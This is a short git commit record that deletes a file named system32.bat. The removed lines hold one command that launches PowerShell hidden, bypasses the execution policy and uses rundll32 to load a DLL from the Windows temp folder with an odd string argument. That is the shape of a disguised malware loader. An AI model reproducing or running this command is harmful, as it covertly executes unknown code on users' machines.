498906397c1853edbd06e0366cf221b7f9632606
CyberSec Consultors <97306773+0v3rdrive@users.noreply.github.com>
2025-05-19 10:24:29 +0200

    Delete system32.bat

--- system32.bat
+++
@@ -1,3 +0,0 @@
-powershell.exe -nop -w hidden -noprofile -executionpolicy bypass -noni C:\windows\system32\cmd.exe cmd /c rundll32 C:\windows\temp\system32_8954395.dll,EPoint comemelaspelotas1234
-
-
